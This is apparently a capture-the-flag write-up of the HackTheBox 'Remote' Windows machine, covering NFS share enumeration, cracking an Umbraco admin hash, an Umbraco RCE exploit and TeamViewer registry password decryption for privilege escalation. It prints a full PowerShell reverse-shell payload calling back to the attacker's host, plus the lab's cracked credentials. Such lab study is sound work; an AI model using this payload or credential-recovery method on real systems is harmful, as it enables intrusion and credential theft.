---
title: Write-up Remote Machine
author: pcw3r
date: 2020-09-25 10:00:00 +0100
categories: [HackTheBox, Pentest]
tags: [WINDOWS, EASY, ENUMERATION, WEB EXPLOITATION, SHARE EXPLOITATION, PAYLOAD, RCE, CVE, PASSWORD DECRYPT]
---

**<center>Ref°: HTB-15-Pentest</center>**

![Desktop View]({{ "/assets/img/remote/HTB-Badge-Remote.png" | relative_url }})

--- Remote is a vulnerable machine through a misconfigured NFS share, a CMS with a vulnerability in its version that allows to get a foothold on the host.

Once on the target machine, a privilege escalation is possible through a vulnerability in our version of Teamviewer with exploitation of regedit.

![Desktop View]({{ "/assets/img/remote/HTB-Information-Remote.png" | relative_url }})

## **<span style='color:#c0392b'>[1] Discovery - Figure out environment</span>**
### Network Service Scanning
***

![Desktop View]({{ "/assets/img/remote/HTB-Images-Remote-nmap.png" | relative_url }})

### File Transfert Protocol
***
Anonymous FTP login allowed. Nothing to exploit here.

### Website and CMS Umbraco
***
![Desktop View]({{ "/assets/img/remote/HTB-Images-Remote-website.png" | relative_url }})

wfuzz tool reveal `install` and `umbraco` path behind the URL. 
`install` path response status code 302 and redirect on `umbraco`. This one response status code 200, we can check it directly.

```terminal
$ wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404,403 http://10.10.10.180/FUZZ
```

![Desktop View]({{ "/assets/img/remote/HTB-Images-Remote-wfuzz.png" | relative_url }})

Or we can get hint from source-page : 

![Desktop View]({{ "/assets/img/remote/HTB-Images-Remote-source_page.png" | relative_url }})

Umbraco is an open-source content management system (CMS) platform for publishing content on the World Wide Web and intranets. 
It is written in C# and deployed on Microsoft based infrastructure.

![Desktop View]({{ "/assets/img/remote/HTB-Images-Remote-login_page.png" | relative_url }})

This CMS seem to be exploitable from different vulnerabilities :

![Desktop View]({{ "/assets/img/remote/HTB-Images-Remote-searchsploit.png" | relative_url }})

![Desktop View]({{ "/assets/img/remote/HTB-Images-Remote-metasploit.png" | relative_url }})

### Network File System
***
The `/site_backups` directory is mountable for everyone.

```terminal
$ showmount -e 10.10.10.180
```

![Desktop View]({{ "/assets/img/remote/HTB-Images-Remote-showmount.png" | relative_url }})

We can exploit a weakly configured NFS share to gain access to remote host followed by enumeration.

References - exploiting nfs share : <https://resources.infosecinstitute.com/exploiting-nfs-share/#gref>

```terminal
$ mkdir site_backups
$ mount -t nfs 10.10.10.180:site_backups site_backups
```

![Desktop View]({{ "/assets/img/remote/HTB-Images-Remote-mount.png" | relative_url }})


## **<span style='color:#c0392b'>[2] Foothold - Get into the target </span>**
### Hashed Password from logfiles
***
We find many others files and folders.

With a little 'grep' command in the NFS share, we search all string value in reference with "admin" "administrator" "password".

```terminal
$ grep -r -i "admin|administrator|password" *
```
We find intereting files `App_Data/Logs/*` and `App_Data/Umbraco.sdf`

We find `admin@htb.local` and `ssmith@htb.local` users in logs files:

![Desktop View]({{ "/assets/img/remote/HTB-Images-Remote-log_files.png" | relative_url }})

We find hash value password of our users in the header of Umbraco.sdf file:

```terminal
$ head Umbraco.sdf
```
![Desktop View]({{ "/assets/img/remote/HTB-Images-Remote-sdf_file.png" | relative_url }})

* admin@htb.local : `b8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}`

* smith@htb.local : `jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}`

### Decrypting Password
***
References - Decrypt SHA1 hash : <https://md5decrypt.net/Sha1/>

* Password decrypt : `baconandcheese` 

![Desktop View]({{ "/assets/img/remote/HTB-Images-Remote-decrypt_sha1.png" | relative_url }})

### Obtaining Reverse Shell with RCE Execution
***
References - RCE umbraco : 
* <https://www.exploit-db.com/exploits/46153>
* <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md>

The script is a PoC, so we need to modify according to our environment.

In the payload part add our reverse shell command in powershell:

```
{ string cmd = "$client = New-Object System.Net.Sockets.TCPClient(\'10.10.14.67\',4445);\
$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};\
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;\
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); \
$sendback=(iex $data | Out-String); $sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \'; \
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);\
$stream.Flush();};$client.Close()"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd;\
proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
</msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
</xsl:template> </xsl:stylesheet> ';
```

* proc.StartInfo.FileName = "powershell.exe"

In the config part:

* login = "admin@htb.local"
* password = "baconandcheese"
* host = "http://10.10.10.180"

![Desktop View]({{ "/assets/img/remote/HTB-Images-Remote-payload.png" | relative_url }})


We listen 4445 port and get reverse shell under iis service.

![Desktop View]({{ "/assets/img/remote/HTB-Images-Remote-rev_shell.png" | relative_url }})

### Flag user
***

And we flag the `Public user`.

![Desktop View]({{ "/assets/img/remote/HTB-Images-Remote-flag_user.png" | relative_url }})

***

## **<span style='color:#c0392b'>[3] Privilege Escalation - Gain higher-level permissions</span>**
### Teamviewer 7 Exploitation
***

With the name of the machine we have a big hint to search way to escalate privilege and compromise the host : `Remote = TeamViewer`

TeamViewer stored admin password encrypted with AES-128-CBC with they key of `0602000000a400005253413100040000` and iv of `0100010067244F436E6762F25EA8D704` in the Windows registry. 
We only need recover the value of the `SecurityPasswordAES` in regedit to decrypt this with key and iv parameters.

References - exploit method : 
* <https://whynotsecurity.com/blog/teamviewer/>
* <https://github.com/n0fate/chainbreaker/issues/10>

### Encrypted Password from Registry
***

``` terminal
reg query HKLM /f teamviewer /t REG_SZ /s
reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7\
```

![Desktop View]({{ "/assets/img/remote/HTB-Images-Remote-regedit.png" | relative_url }})

### Decrypting Password
***
We can decrypt this password using with script python : 

![Desktop View]({{ "/assets/img/remote/HTB-Images-Remote-script.png" | relative_url }})

And get administrator password : `!R3m0te!`

![Desktop View]({{ "/assets/img/remote/HTB-Images-Remote-decrypt_password.png" | relative_url }})

### Remote Service WinRM login and Flag root
***
Reference - evil-winrm : <https://github.com/Hackplayers/evil-winrm>

![Desktop View]({{ "/assets/img/remote/HTB-Images-Remote-flag_root.png" | relative_url }})


***

## **<center>Trophy</center>**

> **It doesn’t matter how many times you get knocked down. All that matters is you get up one more time than you were knocked down.**
>
> Roy T. Bennett
